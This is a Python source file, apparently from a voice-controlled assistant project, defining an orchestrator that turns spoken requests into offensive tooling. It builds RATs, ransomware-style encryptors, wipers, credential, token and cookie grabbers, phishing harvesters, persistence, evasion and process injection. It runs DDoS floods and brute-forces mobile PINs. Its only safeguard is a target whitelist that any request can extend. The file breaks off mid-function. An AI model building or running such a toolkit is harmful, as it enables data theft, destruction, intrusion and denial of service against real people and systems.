"""
Enhanced Cybersecurity Integration with Improvements - Optimized
"""
import os
from typing import Optional, Dict
from agents.orchestrator_pi import PiOrchestrator
from utils.cache_optimizer import SmartCache
from utils.performance_profiler import PerformanceProfiler
from cybersecurity.enhanced_ddos import EnhancedDDoSTester
from cybersecurity.enhanced_malware import EnhancedMalwareLab
from cybersecurity.malware_expansion import ExpandedMalwareLab
from cybersecurity.usb_integration import USBIntegration
from cybersecurity.persistence_mechanisms import PersistenceMechanisms
from cybersecurity.evasion_techniques import EvasionTechniques
from cybersecurity.anti_detection import AntiDetection
from cybersecurity.process_injection import ProcessInjection
from cybersecurity.advanced_obfuscation import AdvancedObfuscator
from cybersecurity.malware_builder import MalwareBuilder
from cybersecurity.advanced_payloads import AdvancedPayloads
from cybersecurity.ai_malware_generator import AIMalwareGenerator
from cybersecurity.ai_credential_grabber import AICredentialGrabber
from cybersecurity.ip_grabber import IPGrabber
from cybersecurity.webhook_grabber import WebhookGrabber
from cybersecurity.token_grabber import TokenGrabber
from cybersecurity.network_analyzer import NetworkAnalyzer
from cybersecurity.log_cleaner import LogCleaner
from cybersecurity.session_hijacker import SessionHijacker
from cybersecurity.social_engineering import SocialEngineeringKit
from cybersecurity.cloud_scanner import CloudScanner
from mobile_security import iOSTestingTools, AndroidTestingTools
from security.vulnerability_scanner import VulnerabilityScanner
from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
from prompts.specialists import SECURITY_PRIVACY_PROMPT
import config_pi as config


class EnhancedCybersecurityOrchestrator:
    """Enhanced cybersecurity orchestrator with improved features"""
    
    def __init__(self, base_orchestrator: Optional[PiOrchestrator] = None):
        self.base_orchestrator = base_orchestrator
        # Add optimized caching and profiling
        self.cache = SmartCache()
        self.profiler = PerformanceProfiler()
        self.malware_lab = EnhancedMalwareLab(isolated_mode=True)
        self.expanded_malware_lab = ExpandedMalwareLab(isolated_mode=True)
        self.ddos_tester = EnhancedDDoSTester(max_threads=50)
        self.usb_integration = USBIntegration()
        self.persistence = PersistenceMechanisms()
        self.evasion = EvasionTechniques()
        self.anti_detection = AntiDetection()
        self.process_injection = ProcessInjection()
        self.advanced_obfuscator = AdvancedObfuscator()
        self.malware_builder = MalwareBuilder()
        self.advanced_payloads = AdvancedPayloads()
        self.ai_malware_generator = AIMalwareGenerator()
        self.ai_grabber = AICredentialGrabber()
        self.ip_grabber = IPGrabber()
        self.webhook_grabber = WebhookGrabber()
        self.token_grabber = TokenGrabber()
        self.network_analyzer = NetworkAnalyzer()
        self.log_cleaner = LogCleaner()
        self.session_hijacker = SessionHijacker()
        self.social_engineering = SocialEngineeringKit()
        self.cloud_scanner = CloudScanner()
        self.ios_tools = iOSTestingTools()
        self.android_tools = AndroidTestingTools()
        self.vulnerability_scanner = VulnerabilityScanner()
        self.nlp = ImprovedNLP()
        self.authorization = EnhancedAuthorization()
        self.reporter = VSOCReporter()
    
    def handle_security_request(self, request: str) -> str:
        """Enhanced request handling with NLP"""
        request_lower = request.lower()
        
        # USB deployment
        if any(word in request_lower for word in ["usb", "deploy", "put on usb", "to usb"]):
            return self._handle_usb_deployment(request)
        
        # Malware creation
        if any(word in request_lower for word in ["create", "make", "generate", "payload", "malware", "virus"]):
            return self._handle_enhanced_malware(request)
        
        # DDoS testing
        if any(word in request_lower for word in ["ddos", "flood", "attack", "stress", "test"]):
            return self._handle_enhanced_ddos(request)
        
        # Reporting
        if any(word in request_lower for word in ["report", "summary", "stats", "results"]):
            return self._handle_reporting(request)
        
        # Authorization
        if any(word in request_lower for word in ["authorize", "whitelist", "permission"]):
            return self._handle_authorization(request)
        
        # Persistence
        if any(word in request_lower for word in ["persist", "startup", "registry", "service", "cron"]):
            return self._handle_persistence(request)
        
        # Evasion
        if any(word in request_lower for word in ["evade", "stealth", "obfuscate", "hide"]):
            return self._handle_evasion(request)
        
        # Anti-detection
        if any(word in request_lower for word in ["anti", "detect", "vm", "debugger", "sandbox"]):
            return self._handle_anti_detection(request)
        
        # Process injection
        if any(word in request_lower for word in ["inject", "process", "dll", "hollow"]):
            return self._handle_process_injection(request)
        
        # Advanced obfuscation
        if any(word in request_lower for word in ["fully obfuscate", "multi layer", "advanced obfuscate"]):
            return self._handle_advanced_obfuscation(request)
        
        # AI malware generation
        if any(word in request_lower for word in ["ai generate malware", "ai create malware", "ai make malware", 
                                                   "program malware", "code malware", "write malware"]):
            return self._handle_ai_malware_generation(request)
        
        # AI credential grabber
        if any(word in request_lower for word in ["ai grabber", "credential grabber", "password grabber", 
                                                   "ai grab", "grab credentials", "harvest credentials"]):
            return self._handle_ai_grabber(request)
        
        # IP grabber
        if any(word in request_lower for word in ["ip grabber", "grab ip", "get ip", "ip grab", 
                                                   "network grabber", "grab network info"]):
            return self._handle_ip_grabber(request)
        
        # Webhook grabber
        if any(word in request_lower for word in ["webhook grabber", "grab webhook", "get webhook", 
                                                   "webhook grab", "discord webhook", "slack webhook"]):
            return self._handle_webhook_grabber(request)
        
        # Token grabber
        if any(word in request_lower for word in ["token grabber", "grab token", "get token", 
                                                   "token grab", "discord token", "github token"]):
            return self._handle_token_grabber(request)
        
        # Network analyzer
        if any(word in request_lower for word in ["network analyzer", "analyze network", "traffic analyzer", 
                                                   "packet capture", "network traffic"]):
            return self._handle_network_analyzer(request)
        
        # Log cleaner
        if any(word in request_lower for word in ["log cleaner", "clean logs", "clear logs", 
                                                   "anti forensics", "clean history"]):
            return self._handle_log_cleaner(request)
        
        # Session hijacker
        if any(word in request_lower for word in ["session hijacker", "hijack session", "steal cookies", 
                                                   "cookie stealer", "session stealer"]):
            return self._handle_session_hijacker(request)
        
        # Social engineering
        if any(word in request_lower for word in ["phishing", "social engineering", "credential harvester", 
                                                   "phishing template", "harvest credentials"]):
            return self._handle_social_engineering(request)
        
        # Cloud scanner
        if any(word in request_lower for word in ["cloud scanner", "scan cloud", "aws scanner", 
                                                  "cloud security", "s3 scanner"]):
            return self._handle_cloud_scanner(request)
        
        # Build custom malware
        if any(word in request_lower for word in ["build", "create custom", "make", "generate"]):
            return self._handle_build_malware(request)
        
        # Advanced payloads
        if any(word in request_lower for word in ["memory only", "fileless", "multistage", "self destruct", 
                                                   "encrypted communication", "domain fronting", "lotl", 
                                                   "ransomware", "backdoor"]):
            return self._handle_advanced_payloads(request)
        
        # Mobile security tools
        if any(word in request_lower for word in ["iphone", "ios", "android", "mobile", "phone"]):
            return self._handle_mobile_security(request)
        
        # Vulnerability scanning
        if any(word in request_lower for word in ["vulnerability", "vuln", "scan vuln", "security scan"]):
            return self._handle_vulnerability_scanning(request)
        
        # Scanning
        if any(word in request_lower for word in ["scan", "nmap", "vulnerability"]):
            return self._handle_scanning(request)
        
        # General security
        return self._handle_general_security(request)
    
    def _handle_enhanced_malware(self, request: str) -> str:
        """Handle malware creation with options"""
        request_lower = request.lower()
        
        # Check for expanded malware types first
        expanded_types = {
            "rat": "rat",
            "remote access": "rat",
            "trojan": "rat",
            "credential": "credential_harvester",
            "harvester": "credential_harvester",
            "password": "credential_harvester",
            "exfiltrate": "data_exfiltrator",
            "exfiltration": "data_exfiltrator",
            "steal data": "data_exfiltrator",
            "miner": "cryptominer",
            "crypto": "cryptominer",
            "mine": "cryptominer",
            "wipe": "wiper",
            "wiper": "wiper",
            "destroy": "wiper",
            "fileless": "fileless",
            "memory": "fileless",
            "polymorphic": "polymorphic",
            "self modifying": "polymorphic",
            "hijack": "browser_hijacker",
            "browser": "browser_hijacker"
        }
        
        payload_type = None
        use_expanded = False
        
        for keyword, ptype in expanded_types.items():
            if keyword in request_lower:
                payload_type = ptype
                use_expanded = True
                break
        
        # Fall back to basic types
        if not payload_type:
            if "keylogger" in request_lower:
                payload_type = "keylogger"
            elif "reverse" in request_lower or "shell" in request_lower:
                payload_type = "reverse_shell"
            elif "encrypt" in request_lower or "ransom" in request_lower:
                payload_type = "file_encryptor"
            elif "scanner" in request_lower or "network scan" in request_lower:
                payload_type = "network_scanner"
        
        if not payload_type:
            # List available payloads
            basic = ["keylogger", "reverse_shell", "file_encryptor", "network_scanner"]
            advanced = ["rat", "credential_harvester", "data_exfiltrator", "cryptominer", 
                       "wiper", "fileless", "polymorphic", "browser_hijacker"]
            return f"Specify payload type. Basic: {', '.join(basic)}. Advanced: {', '.join(advanced)}"
        
        # Use expanded lab for advanced payloads
        if use_expanded:
            try:
                if payload_type == "rat":
                    payload = self.expanded_malware_lab.create_rat()
                elif payload_type == "credential_harvester":
                    payload = self.expanded_malware_lab.create_credential_harvester()
                elif payload_type == "data_exfiltrator":
                    payload = self.expanded_malware_lab.create_data_exfiltrator()
                elif payload_type == "cryptominer":
                    payload = self.expanded_malware_lab.create_cryptominer()
                elif payload_type == "wiper":
                    payload = self.expanded_malware_lab.create_wiper()
                elif payload_type == "fileless":
                    payload = self.expanded_malware_lab.create_fileless_malware()
                elif payload_type == "polymorphic":
                    # Need base payload for polymorphic
                    base = self.malware_lab.create_obfuscated_payload("keylogger", "none")
                    payload = self.expanded_malware_lab.create_polymorphic_engine(base.get("file", ""))
                elif payload_type == "browser_hijacker":
                    payload = self.expanded_malware_lab.create_browser_hijacker()
                else:
                    payload = None
                
                if payload:
                    return f"Created {payload_type}: {payload['file']}. {payload.get('warning', 'Educational only.')}"
            except Exception as e:
                return f"Error creating {payload_type}: {str(e)}"
        
        # Check for obfuscation
        obfuscation = None
        if "obfuscate" in request_lower or "obfuscated" in request_lower:
            obfuscation = "base64" if "base64" in request_lower else "compression"
        
        if obfuscation:
            payload = self.malware_lab.create_obfuscated_payload(payload_type, obfuscation)
            return f"Created obfuscated {payload_type} with {obfuscation}: {payload['file']}. {payload['warning']}"
        else:
            # Use enhanced malware lab
            payload = self.malware_lab.create_obfuscated_payload(payload_type, "none")
            return f"Created {payload_type}: {payload['file']}. {payload['warning']}"
    
    def _handle_enhanced_ddos(self, request: str) -> str:
        """Handle DDoS with natural language parsing"""
        try:
            # Parse command
            attack_config = self.ddos_tester.parse_attack_command(request)
            
            # Check authorization
            is_auth, message = self.authorization.is_authorized(attack_config["target"])
            if not is_auth:
                return f"Authorization failed: {message}"
            
            # Execute attack
            attack_type = attack_config["type"]
            target = attack_config["target"]
            port = attack_config["port"]
            duration = attack_config["duration"]
            threads = attack_config["intensity"]
            
            if attack_type == "tcp":
                result = self.ddos_tester.advanced_tcp_flood(target, port, duration, threads)
            elif attack_type == "udp":
                result = self.ddos_tester.udp_flood(target, port, duration)
            elif attack_type == "http":
                url = f"http://{target}:{port}" if port != 80 else f"http://{target}"
                if "post" in request.lower():
                    result = self.ddos_tester.http_post_flood(url, duration, threads)
                else:
                    result = self.ddos_tester.http_flood(url, duration)
            elif attack_type == "slowloris":
                result = self.ddos_tester.slowloris(target, port, duration)
            elif attack_type == "icmp":
                result = self.ddos_tester.icmp_flood(target, duration, threads)
            else:
                result = self.ddos_tester.advanced_tcp_flood(target, port, duration, threads)
            
            # Format response
            response = f"{result['type']} completed. "
            if 'packets_sent' in result:
                response += f"{result['packets_sent']} packets sent. "
            if 'packets_per_second' in result:
                response += f"Rate: {result['packets_per_second']:.2f} pps. "
            if 'report' in result:
                response += f"Report saved to VSOC. "
            response += result.get('warning', '')
            
            return response
            
        except ValueError as e:
            return f"Error parsing command: {str(e)}. Specify target, duration, and attack type."
        except Exception as e:
            return f"Attack error: {str(e)}"
    
    def _handle_reporting(self, request: str) -> str:
        """Handle reporting requests"""
        import os
        import glob
        
        report_files = glob.glob("./vsoc_reports/*.json")
        if not report_files:
            return "No attack reports found."
        
        count = len(report_files)
        latest = max(report_files, key=os.path.getctime)
        
        return f"Found {count} attack reports. Latest: {os.path.basename(latest)}. Check ./vsoc_reports/ for details."
    
    def _handle_authorization(self, request: str) -> str:
        """Handle authorization requests"""
        target_info = self.nlp.extract_target(request)
        if target_info:
            target, _ = target_info
            self.authorization.add_target(target, "User request")
            return f"Added {target} to authorized targets."
        return "Could not extract target. Specify IP or hostname."
    
    def _handle_scanning(self, request: str) -> str:
        """Handle scanning requests"""
        from cybersecurity.security_agent import SecurityTools
        tools = SecurityTools()
        available = tools.check_tools()
        
        if available.get("nmap"):
            target_info = self.nlp.extract_target(request)
            if target_info:
                target, port = target_info
                cmd = tools.generate_nmap_scan(target, "basic")
                return f"Run: {cmd} (authorized networks only)"
            return "Nmap available. Specify target."
        return "Install nmap: sudo apt-get install nmap"
    
    def _handle_usb_deployment(self, request: str) -> str:
        """Handle USB deployment requests"""
        return self.usb_integration.handle_voice_command(request)
    
    def _handle_persistence(self, request: str) -> str:
        """Handle persistence mechanism requests"""
        request_lower = request.lower()
        
        # Extract payload path (simplified)
        payload_path = None
        if "payload" in request_lower or "file" in request_lower:
            # Try to extract path (simplified)
            import re
            path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
            if path_match:
                payload_path = path_match.group()
        
        if not payload_path:
            return "Specify payload path for persistence. Example: 'Add registry persistence for payload.py'"
        
        # Determine persistence type
        if "registry" in request_lower:
            result = self.persistence.create_registry_persistence(payload_path)
        elif "service" in request_lower:
            result = self.persistence.create_service_persistence(payload_path)
        elif "scheduled" in request_lower or "task" in request_lower:
            result = self.persistence.create_scheduled_task(payload_path)
        elif "startup" in request_lower or "folder" in request_lower:
            result = self.persistence.create_startup_folder(payload_path)
        elif "cron" in request_lower:
            result = self.persistence.create_cron_persistence(payload_path)
        else:
            # Default to startup folder
            result = self.persistence.create_startup_folder(payload_path)
        
        if result.get("error"):
            return f"Persistence error: {result['error']}"
        
        return f"Created {result['type']} persistence: {result['file']}. {result.get('warning', '')}"
    
    def _handle_evasion(self, request: str) -> str:
        """Handle evasion technique requests"""
        request_lower = request.lower()
        
        # Extract payload path
        payload_path = None
        import re
        path_match = re.search(r'[A-Za-z]:\\[^\s]+|/[^\s]+', request)
        if path_match:
            payload_path = path_match.group()
        
        if not payload_path or not os.path.exists(payload_path):
            return "Specify valid payload path. Example: 'Create stealth version of keylogger.py'"
        
        # Determine evasion methods
        methods = []
        if "obfuscate" in request_lower:
            methods.append("obfuscate")
        if "compress" in request_lower:
            methods.append("compress")
        if "encrypt" in request_lower:
            methods.append("encrypt")
        if "junk" in request_lower:
            methods.append("junk")
        if "polymorphic" in request_lower:
            methods.append("polymorphic")
        
        if not methods:
            methods = ["obfuscate", "compress"]  # Default
        
        result = self.evasion.create_stealth_payload(payload_path, methods)
        
        return f"Created stealth payload: {result['evaded']}. Methods: {', '.join(methods)}. {result.get('warning', '')}"
    
    def _handle_general_security(self, request: str) -> str:
        """Handle general security questions"""
        if self.base_orchestrator:
            return self.base_orchestrator.process(
                f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
            )
        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, AI malware generation, AI credential grabber, IP grabber, webhook grabber, token grabber, network analyzer, log cleaner, session hijacker, social engineering, cloud scanner, iOS/Android security tools, scanning, reporting."
    
    def _handle_session_hijacker(self, request: str) -> str:
        """Handle session hijacker requests"""
        request_lower = request.lower()
        
        target_types = []
        if "cookie" in request_lower:
            target_types.append("cookies")
        if "session" in request_lower:
            target_types.append("sessions")
        if "token" in request_lower:
            target_types.append("tokens")
        target_types = target_types or ["cookies", "sessions"]
        
        exfil_method = "http"
        if "dns" in request_lower:
            exfil_method = "dns"
        elif "file" in request_lower:
            exfil_method = "file"
        
        result = self.session_hijacker.create_session_hijacker(target_types, exfil_method)
        return f"Created session hijacker: {result['file']}. Types: {', '.join(result['target_types'])}. {result['warning']}"
    
    def _handle_social_engineering(self, request: str) -> str:
        """Handle social engineering requests"""
        request_lower = request.lower()
        
        # Extract target service
        target_service = "generic"
        if "gmail" in request_lower or "google" in request_lower:
            target_service = "gmail"
        elif "facebook" in request_lower:
            target_service = "facebook"
        elif "microsoft" in request_lower or "outlook" in request_lower:
            target_service = "microsoft"
        elif "amazon" in request_lower:
            target_service = "amazon"
        
        if "phishing" in request_lower or "template" in request_lower:
            result = self.social_engineering.create_phishing_template(target_service)
            return f"Created phishing template: {result['file']}. Target: {result['target_service']}. {result['warning']}"
        elif "harvester" in request_lower or "harvest" in request_lower:
            result = self.social_engineering.create_credential_harvester(target_service)
            return f"Created credential harvester: {result['file']}. Target: {result['target_service']}. {result['warning']}"
        else:
            # Default to phishing template
            result = self.social_engineering.create_phishing_template(target_service)
            return f"Created phishing template: {result['file']}. Target: {result['target_service']}. {result['warning']}"
    
    def _handle_cloud_scanner(self, request: str) -> str:
        """Handle cloud scanner requests"""
        request_lower = request.lower()
        
        cloud_provider = "aws"
        if "azure" in request_lower:
            cloud_provider = "azure"
        elif "gcp" in request_lower or "google" in request_lower:
            cloud_provider = "gcp"
        
        scan_types = []
        if "s3" in request_lower or "bucket" in request_lower:
            scan_types.append("s3_buckets")
        if "iam" in request_lower or "role" in request_lower:
            scan_types.append("iam_roles")
        if "security group" in request_lower or "sg" in request_lower:
            scan_types.append("security_groups")
        scan_types = scan_types or ["s3_buckets", "iam_roles", "security_groups"]
        
        result = self.cloud_scanner.create_cloud_scanner(cloud_provider, scan_types)
        return f"Created cloud scanner: {result['file']}. Provider: {result['cloud_provider']}. Scans: {', '.join(result['scan_types'])}. {result['warning']}"
    
    def _handle_webhook_grabber(self, request: str) -> str:
        """Handle webhook grabber requests"""
        request_lower = request.lower()
        
        target_types = []
        if "discord" in request_lower:
            target_types.append("discord")
        if "slack" in request_lower:
            target_types.append("slack")
        if "telegram" in request_lower:
            target_types.append("telegram")
        if "generic" in request_lower or "all" in request_lower:
            target_types.append("generic")
        target_types = target_types or ["discord", "slack", "telegram", "generic"]
        
        test_webhook = "test" in request_lower or "verify" in request_lower
        
        result = self.webhook_grabber.create_webhook_grabber(target_types, test_webhook)
        return f"Created webhook grabber: {result['file']}. Targets: {', '.join(result['target_types'])}. {result['warning']}"
    
    def _handle_token_grabber(self, request: str) -> str:
        """Handle token grabber requests"""
        request_lower = request.lower()
        
        target_types = []
        if "discord" in request_lower:
            target_types.append("discord")
        if "github" in request_lower:
            target_types.append("github")
        if "steam" in request_lower:
            target_types.append("steam")
        if "spotify" in request_lower:
            target_types.append("spotify")
        if "generic" in request_lower or "all" in request_lower:
            target_types.append("generic")
        target_types = target_types or ["discord", "github", "steam", "spotify", "generic"]
        
        result = self.token_grabber.create_token_grabber(target_types)
        return f"Created token grabber: {result['file']}. Targets: {', '.join(result['target_types'])}. {result['warning']}"
    
    def _handle_network_analyzer(self, request: str) -> str:
        """Handle network analyzer requests"""
        request_lower = request.lower()
        
        analysis_types = []
        if "packet" in request_lower or "capture" in request_lower:
            analysis_types.append("packet_capture")
        if "traffic" in request_lower:
            analysis_types.append("traffic_analysis")
        if "protocol" in request_lower:
            analysis_types.append("protocol_analysis")
        if "suspicious" in request_lower:
            analysis_types.append("suspicious_activity")
        analysis_types = analysis_types or ["packet_capture", "traffic_analysis", "protocol_analysis"]
        
        # Extract duration
        import re
        duration_match = re.search(r'(\\d+)\\s*(?:second|sec|minute|min)', request_lower)
        duration = int(duration_match.group(1)) if duration_match else 60
        if "minute" in request_lower or "min" in request_lower:
            duration *= 60
        
        result = self.network_analyzer.create_network_analyzer(analysis_types, duration)
        return f"Created network analyzer: {result['file']}. Types: {', '.join(result['analysis_types'])}. Duration: {result['capture_duration']}s. {result['warning']}"
    
    def _handle_log_cleaner(self, request: str) -> str:
        """Handle log cleaner requests"""
        request_lower = request.lower()
        
        clean_types = []
        if "system" in request_lower or "log" in request_lower:
            clean_types.append("system_logs")
        if "browser" in request_lower or "history" in request_lower:
            clean_types.append("browser_history")
        if "recent" in request_lower:
            clean_types.append("recent_files")
        if "temp" in request_lower:
            clean_types.append("temp_files")
        clean_types = clean_types or ["system_logs", "browser_history", "recent_files", "temp_files"]
        
        clean_method = "overwrite"
        if "secure" in request_lower or "wipe" in request_lower:
            clean_method = "secure_delete"
        
        result = self.log_cleaner.create_log_cleaner(clean_types, clean_method)
        return f"Created log cleaner: {result['file']}. Types: {', '.join(result['clean_types'])}. Method: {result['clean_method']}. {result['warning']}"
    
    def _handle_ip_grabber(self, request: str) -> str:
        """Handle IP grabber requests"""
        request_lower = request.lower()
        
        # Extract grab types
        grab_types = []
        if "local" in request_lower or "local ip" in request_lower:
            grab_types.append("local_ip")
        if "public" in request_lower or "public ip" in request_lower:
            grab_types.append("public_ip")
        if "network" in request_lower or "network info" in request_lower:
            grab_types.append("network_info")
        if "dns" in request_lower:
            grab_types.append("dns_servers")
        if "connection" in request_lower:
            grab_types.append("connections")
        if "routing" in request_lower or "route" in request_lower:
            grab_types.append("routing")
        if "arp" in request_lower:
            grab_types.append("arp")
        
        grab_types = grab_types or ["local_ip", "public_ip", "network_info", "dns_servers"]
        
        # Extract exfiltration method
        exfil_method = "http"
        if "dns" in request_lower and "exfil" in request_lower:
            exfil_method = "dns"
        elif "file" in request_lower:
            exfil_method = "file"
        
        # Extract exfil URL
        import re
        url_match = re.search(r'https?://[^\s]+', request)
        exfil_url = url_match.group() if url_match else None
        
        # Check for advanced features
        if any(word in request_lower for word in ["advanced", "geolocation", "whois", "port scan", "subnet"]):
            features = []
            if "geolocation" in request_lower or "geo" in request_lower:
                features.append("geolocation")
            if "whois" in request_lower:
                features.append("whois")
            if "port" in request_lower or "scan" in request_lower:
                features.append("port_scan")
            if "subnet" in request_lower:
                features.append("subnet_scan")
            features = features or ["geolocation", "whois"]
            
            result = self.ip_grabber.create_advanced_ip_grabber(features)
            return f"Created advanced IP grabber: {result['file']}. Features: {', '.join(result['features'])}. {result['warning']}"
        
        # Check for stealth
        elif any(word in request_lower for word in ["stealth", "hidden", "covert"]):
            stealth_method = "dns"
            if "icmp" in request_lower:
                stealth_method = "icmp"
            elif "http" in request_lower and "header" in request_lower:
                stealth_method = "http_headers"
            
            result = self.ip_grabber.create_stealth_ip_grabber(stealth_method)
            return f"Created stealth IP grabber: {result['file']}. Method: {result['stealth_method']}. {result['warning']}"
        
        # Standard IP grabber
        else:
            result = self.ip_grabber.create_ip_grabber(grab_types, exfil_method, exfil_url)
            return f"Created IP grabber: {result['file']}. Types: {', '.join(result['grab_types'])}. Method: {result['exfil_method']}. {result['warning']}"
    
    def _handle_ai_grabber(self, request: str) -> str:
        """Handle AI credential grabber requests"""
        request_lower = request.lower()
        
        # Extract target type
        target_type = "browser"
        if "browser" in request_lower:
            target_type = "browser"
        elif "system" in request_lower:
            target_type = "system"
        elif "wifi" in request_lower:
            target_type = "wifi"
        
        # Extract exfiltration method
        exfil_method = "http"
        if "dns" in request_lower:
            exfil_method = "dns"
        elif "file" in request_lower:
            exfil_method = "file"
        
        # Extract exfil URL
        import re
        url_match = re.search(r'https?://[^\s]+', request)
        exfil_url = url_match.group() if url_match else None
        
        # Extract browsers
        browsers = []
        if "chrome" in request_lower:
            browsers.append("chrome")
        if "firefox" in request_lower:
            browsers.append("firefox")
        if "edge" in request_lower:
            browsers.append("edge")
        browsers = browsers or ["chrome", "firefox"]
        
        # Extract grab types for system grabber
        grab_types = []
        if "wifi" in request_lower:
            grab_types.append("wifi")
        if "system" in request_lower or "info" in request_lower:
            grab_types.append("system")
        if "clipboard" in request_lower:
            grab_types.append("clipboard")
        if "screenshot" in request_lower:
            grab_types.append("screenshots")
        grab_types = grab_types or ["wifi", "system", "clipboard"]
        
        try:
            if target_type == "browser":
                result = self.ai_grabber.create_browser_grabber(browsers, exfil_url)
                return f"Created browser credential grabber: {result['file']}. Browsers: {', '.join(result['browsers'])}. {result['warning']}"
            elif target_type == "system":
                result = self.ai_grabber.create_system_grabber(grab_types)
                return f"Created system information grabber: {result['file']}. Types: {', '.join(result['grab_types'])}. {result['warning']}"
            else:
                # AI-generated grabber
                description = request
                result = self.ai_grabber.create_ai_enhanced_grabber(description)
                if result.get('success'):
                    return f"Created AI-enhanced grabber: {result['file']}. {result['warning']}"
                else:
                    return f"Error: {result.get('error', 'Unknown error')}"
        except Exception as e:
            return f"Error creating grabber: {str(e)}"
    
    def _handle_mobile_security(self, request: str) -> str:
        """Handle mobile security testing requests"""
        request_lower = request.lower()
        
        # iOS tools
        if "ios" in request_lower or "iphone" in request_lower:
            if "pin" in request_lower or "brute" in request_lower:
                result = self.ios_tools.create_pin_brute_force_script()
                return f"Created iOS PIN brute force script: {result['file']}. {result['warning']}"
            elif "backup" in request_lower:
                result = self.ios_tools.create_backup_extractor()
                return f"Created iOS backup extractor: {result['file']}. {result['warning']}"
            elif "frida" in request_lower or "hook" in request_lower:
                # Extract app name
                import re
                app_match = re.search(r'app\s+([\w\.-]+)', request_lower)
                app_name = app_match.group(1) if app_match else "com.example.app"
                result = self.ios_tools.create_frida_hook_script(app_name)
                return f"Created iOS Frida hook script: {result['file']}. App: {result['app']}. {result['warning']}"
            elif "ipa" in request_lower or "analyze" in request_lower:
                result = self.ios_tools.create_ipa_analyzer()
                return f"Created iOS IPA analyzer: {result['file']}. {result['warning']}"
            else:
                return "iOS tools: PIN brute force, backup extractor, Frida hooks, IPA analyzer"
        
        # Android tools
        elif "android" in request_lower:
            if "pin" in request_lower or "pattern" in request_lower or "brute" in request_lower:
                result = self.android_tools.create_pin_pattern_brute_force()
                return f"Created Android PIN/pattern brute force: {result['file']}. {result['warning']}"
            elif "apk" in request_lower or "analyze" in request_lower:
                result = self.android_tools.create_apk_analyzer()
                return f"Created Android APK analyzer: {result['file']}. {result['warning']}"
            elif "frida" in request_lower or "hook" in request_lower:
                import re
                package_match = re.search(r'package\s+([\w\.]+)', request_lower)
                package = package_match.group(1) if package_match else "com.example.app"
                result = self.android_tools.create_frida_hook_script(package)
                return f"Created Android Frida hook: {result['file']}. Package: {result['package']}. {result['warning']}"
            elif "adb" in request_lower:
                exploit_type = "backup"
                if "backup" in request_lower:
                    exploit_type = "backup"
                elif "shell" in request_lower:
                    exploit_type = "shell"
                elif "logcat" in request_lower:
                    exploit_type = "logcat"
                result = self.android_tools.create_adb_exploit_script(exploit_type)
                return f"Created Android ADB exploit: {result['file']}. Type: {result['exploit']}. {result['warning']}"
            else:
                return "Android tools: PIN/pattern brute force, APK analyzer, Frida hooks, ADB exploits"
        
        return "Mobile security tools available for iOS and Android. Specify platform and tool type."
    
    def _handle_vulnerability_scanning(self, request: str) -> str:
        """Handle vulnerability scanning requests"""
        request_lower = request.lower()
        
        # Extract target
        import re
        ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', request)
        url_match = re.search(r'https?://[^\s]+', request)
        
        if url_match:
            # Web vulnerability scan
            url = url_match.group()
            scan_type = "intensive" if "intensive" in request_lower else "basic"
            result = self.vulnerability_scanner.create_web_vulnerability_scanner(url)
            return f"Created web vulnerability scanner: {result['file']}. Target: {result['url']}. {result['warning']}"
        
        elif ip_match:
            # Network vulnerability scan
            target = ip_match.group()
            scan_type = "intensive" if "intensive" in request_lower else "quick" if "quick" in request_lower else "basic"
            result = self.vulnerability_scanner.scan_vulnerabilities(target, scan_type)
            if result.get('success') is False:
                return f"Error: {result.get('error')}"
            return f"Created vulnerability scan: {result['file']}. Target: {result['target']}. Type: {result['scan_type']}. {result['warning']}"
        
        return "Specify target. Example: 'Scan vulnerabilities on 192.168.1.1' or 'Scan web vulnerabilities on https://example.com'"
    
    def _handle_ai_malware_generation(self, request: str) -> str:
        """Handle AI-powered malware generation"""
        try:
            result = self.ai_malware_generator.generate_from_voice(request)
            if result.get('success'):
                return f"AI-generated malware saved to: {result['file']}\nType: {result.get('type', 'custom')}\nFeatures: {', '.join(result.get('features', []))}\n\n{result['warning']}"
            else:
                return f"Error generating malware: {result.get('error', 'Unknown error')}"
        except Exception as e:
            return f"Error: {str(e)}"
    
    def _handle_build_malware(self, request: str) -> str:
        """Handle custom malware building"""
        try:
            result = self.malware_builder.build_from_voice(request)
            return f"Created custom {result['type']} payload: {result['file']}. Features: {', '.join(result.get('features', []))}. {result['warning']}"
        except Exception as e:
            return f"Error building malware: {str(e)}. Specify type: keylogger, reverse shell, file encryptor, etc."
    
    def _handle_advanced_payloads(self, request: str) -> str:
        """Handle advanced payload creation"""
        request_lower = request.lower()
        
        # Memory-only/fileless
        if "memory only" in request_lower or "fileless" in request_lower:
            base = "print('Fileless payload')"
            result = self.advanced_payloads.create_memory_only_payload(base)
            return f"Created memory-only payload: {result['file']}. {result['warning']}"
        
        # Multi-stage
        elif "multistage" in request_lower or "multi stage" in request_lower:
            import re
            urls = re.findall(r'https?://[^\s]+', request)
            if urls:
                result = self.advanced_payloads.create_multi_stage_payload(urls)
                return f"Created multi-stage payload: {result['file']}. Stages: {result['stages']}. {result['warning']}"
            return "Specify stage URLs. Example: 'Create multistage payload with http://example.com/stage1.py and http://example.com/stage2.py'"
        
        # Self-destruct
        elif "self destruct" in request_lower:
            base = "print('Self-destructing payload')"
            result = self.advanced_payloads.create_self_destruct_payload(base)
            return f"Created self-destruct payload: {result['file']}. {result['warning']}"
        
        # Encrypted communication
        elif "encrypted communication" in request_lower or "encrypted comm" in request_lower:
            import re
            ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', request)
            port_match = re.search(r'port\s+(\d+)', request_lower)
            
            ip = ip_match.group(1) if ip_match else "127.0.0.1"
            port = int(port_match.group(1)) if port_match else 4444
            
            result = self.advanced_payloads.create_encrypted_communication_payload(ip, port)
            return f"Created encrypted communication payload: {result['file']}. Target: {result['target']}. {result['warning']}"
        
        # Domain fronting
        elif "domain fronting" in request_lower:
            import re
            domains = re.findall(r'[\w\.-]+\.\w+', request)
            if len(domains) >= 2:
                result = self.advanced_payloads.create_domain_fronting_payload(domains[0], domains[1])
                return f"Created domain fronting payload: {result['file']}. Front: {result['front_domain']}, Real: {result['real_domain']}. {result['warning']}"
